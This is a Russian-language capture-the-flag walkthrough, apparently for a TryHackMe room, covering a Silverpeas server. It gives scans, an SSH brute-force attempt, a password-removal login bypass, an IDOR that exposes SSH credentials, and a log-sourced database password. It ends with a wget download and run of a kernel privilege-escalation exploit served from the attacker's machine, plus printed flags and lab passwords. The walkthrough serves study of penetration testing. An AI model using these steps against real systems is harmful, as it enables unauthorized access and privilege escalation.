**IP**: меняется.
**Общее времяпровождение в комнате:** около 200 минут.

## 1. Разведка

### Nmap

```bash
sudo nmap -sV -sS 10.114.146.144
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-27 09:06 EDT
Nmap scan report for 10.114.146.144
Host is up (0.19s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http       nginx 1.18.0 (Ubuntu)
8080/tcp open  http-proxy
```

Открыты три порта. Основной интерес — 8080(это было понято не сразу ).

### Nuclei

```bash
nuclei -u 10.114.146.144 -severity low,medium,high,critical -o nuclei_results.txt
```

```
[CVE-2023-48795] [javascript] [medium] 10.114.146.144:22 ["Vulnerable to Terrapin"]
[INF] Scan completed in 1m. 1 matches found.
```

Найдена только Terrapin (CVE-2023-48795) на SSH. Для дальнейшего продвижения это неинтересно.

---

## 2. Перебор SSH (неудачный)

Попытка брутфорса через Metasploit:

```bash
# модуль auxiliary/scanner/ssh/ssh_login
# username: scr1ptkiddy h4x0r (статичный)
# passwords: /home/deb88/HH101/seclists/Passwords/Leaked-Databases/rockyou-75.txt
```

**Ссылка на методику:**  
https://medium.com/@zendpushkar/ssh-exploitation-brute-force-attack-and-privilege-escalation-e0772c64a77d

Брут не дал результата. Вспомнил о порте 8080.

---

## 3. Обнаружение

### Gobuster на порту 8080

```bash
gobuster dir -u 10.112.155.196:8080 -w /home/deb88/HH101/seclists/Discovery/Web-Content/big.txt -x php,html,txt
```

```
/console              (Status: 302) [Size: 0] [--> /noredirect.html]
/website              (Status: 302) [Size: 0] [--> http://10.112.155.196:8080/website/]
Progress: 19008 / 19008 (100.00%)
```

В разделе `#contact` выясняется, что **Silverpeas** — это название ПО, а не комнаты.

### Поиск эксплойта

Случайно найдено(по запросу Silverpeas CVE):

https://github.com/RhinoSecurityLabs/CVEs/tree/master/CVE-2023-47320

Я понял, что на 8080 есть что-то намного интереснее, чем ничего.

### Gobuster по /silverpeas

```bash
gobuster dir -u http://10.112.155.196:8080/silverpeas -w /home/deb88/HH101/seclists/Discovery/Web-Content/big.txt -x php,html,txt
```

Ключевые находки:

```
/Login                (Status: 302) [Size: 0] [--> http://10.112.155.196:8080/silverpeas/defaultLogin.jsp]
/Main                 (Status: 302) [Size: 0] [--> http://10.112.155.196:8080/silverpeas/admin/jsp/silverpeas-main.jsp]
/admin                (Status: 302) [Size: 0] [--> http://10.112.155.196:8080/silverpeas/admin/]
/dt                   (Status: 200) [Size: 548]
/proxy                (Status: 200) [Size: 548]
/j_security_check     (Status: 500) [Size: 842]
/sso                  (Status: 302) [Size: 0] [--> http://10.112.155.196:8080/silverpeas/Login?ErrorCode=2&DomainId=-1]
... (много других путей)
Progress: 81924 / 81928 (100.00%)
```

Страница логина: `/silverpeas/defaultLogin.jsp`
Но тут как оказалось интерес в другом.

---

## 4. Обход аутентификации (Authentication Bypass)

Через Caido перехватываем запрос на логин.

Исходный запрос содержит логин и пароль. Удаляем переменную пароля полностью:

```
Login=scr1ptkiddy&DomainId=0
```

После отправки такого запроса получаем доступ:

```
http://10.112.171.255:8080/silverpeas/look/jsp/MainFrame.jsp#
```

Успешный вход без пароля под пользователем `scr1ptkiddy`.

---

## 5. IDOR — чтение чужих сообщений

В модуле сообщений (Silvermail) меняем ID в запросе на 6: 

```http
GET /silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=6 HTTP/1.1
```

Содержимое сообщения:

```
Dude how do you always forget the SSH password? Use a password manager and quit using your silly sticky notes. 

Username: tim
Password: cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol
```

Получаем SSH-учётные данные пользователя `tim` и входим.

---

## 6. User Flag

```bash
ssh tim@10.xxx.xxx.xxx
# пароль: cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol

cat user.txt
THM{c4ca4238a0b923820dcc509a6f75849b}
```

```bash
id
uid=1001(tim) gid=1001(tim) groups=1001(tim),4(adm)
```

Пользователь `tim` входит в группу `adm`.

---

## 7. Анализ привилегий и логов

```bash
grep tyler /etc/passwd
tyler:x:1000:1000:root:/home/tyler:/bin/bash
```

```bash
# группы
adm:x:4:syslog,tyler,tim,ubuntu
sudo:x:27:tyler,ubuntu
docker:x:119:
```

`tyler` имеет sudo и состоит в docker. Нужен доступ к его учётке(по задумке возможно, но я прошел по-другому).

### Логи Docker

В `/var/log` (доступна группе `adm`) найдены записи:

```
/var/log/auth.log.2:Dec 13 15:45:21 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name silverpeas -p 8080:8000 -d -e DB_NAME=Silverpeas -e DB_USER=silverpeas -e DB_PASSWORD=_Zd_zx7N823/ -v silverpeas-log:/opt/silverpeas/log -v silverpeas-data:/opt/silvepeas/data --link postgresql:database silverpeas:silverpeas-6.3.1
/var/log/auth.log.2:Dec 13 15:45:21 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
```

Извлечённые данные:
- `DB_NAME=Silverpeas`
- `DB_USER=silverpeas`
- `DB_PASSWORD=_Zd_zx7N823/`

Silverpeas работает внутри Docker-контейнера.

### SUID-бинарники

```bash
find / -perm -4000 -type f 2>/dev/null
```

```
/snap/core20/2264/usr/bin/chfn
/snap/core20/2264/usr/bin/chsh
...
/usr/bin/sudo
/usr/bin/su
/usr/bin/pkexec
...
```

Классические SUID, ничего экзотического.

---

## 8. Privilege Escalation — Copy Fail (CVE-2026-31431)

LinPEAS обнаружил уязвимость:

```
╔══════════╣ Checking for Copy Fail (CVE-2026-31431) (T1068)
╚ https://copy.fail/
╚ https://www.cve.org/CVERecord?id=CVE-2026-31431
VULNERABLE: non-destructive AF_ALG/splice page-cache write triggered
```

Эксплойт:  
https://github.com/theori-io/copy-fail-CVE-2026-31431/blob/main/copy_fail_exp.py

### Использование

На атакующей машине:

```bash
sudo python3 -m http.server 80
```

На цели:

```bash
tim@ip-10-113-135-146:/tmp$ wget http://192.168.154.82/copy_fail_exp.py
python3 copy_fail_exp.py
```

Результат:

```bash
# id
uid=0(root) gid=1001(tim) groups=1001(tim),4(adm)
```

Переходим в `/root` и читаем флаг:

```bash
cat /root/root.txt
THM{098f6bcd4621d373cade4e832627b4f6}
```

---

## 9. Как работает эксплойт Copy Fail

**CVE-2026-31431** — уязвимость в механизме `AF_ALG` + `splice` ядра Linux.  
Она позволяет создать неразрушающую запись в page-cache.  
Эксплойт использует эту возможность для перезаписи привилегированных структур/страниц памяти и получения root-прав (T1068).

Подробности и код:  
https://github.com/theori-io/copy-fail-CVE-2026-31431/blob/main/copy_fail_exp.py  
https://copy.fail/

---

## 10. Полезные ресурсы 

- https://medium.com/@zendpushkar/ssh-exploitation-brute-force-attack-and-privilege-escalation-e0772c64a77d
- https://github.com/RhinoSecurityLabs/CVEs/tree/master/CVE-2023-47320
- https://hacktricks-training.com/courses/lhe/
- https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html
- https://copy.fail/
- https://www.cve.org/CVERecord?id=CVE-2026-31431
- https://github.com/theori-io/copy-fail-CVE-2026-31431/blob/main/copy_fail_exp.py

---

## Итоговые флаги

| Флаг     | Значение                                      |
|----------|-----------------------------------------------|
| user.txt | `THM{c4ca4238a0b923820dcc509a6f75849b}`       |
| root.txt | `THM{098f6bcd4621d373cade4e832627b4f6}`       |

**Цепочка:**  
Nmap → Nuclei → Gobuster → Auth Bypass (удаление пароля) → IDOR в сообщениях → SSH как `tim` → чтение логов (adm) → LinPEAS → Copy Fail exploit → root.

Прочитав другие writeupы, узнал, что все было куда логичнее. У юзера Тайлера был пароль такой же как и у БД постгрес: `POSTGRES_PASSWORD=_Zd_zx7N823/`.
После этого мы могли войти `su tyler` в его учетку и зайти в директорию `/root`.

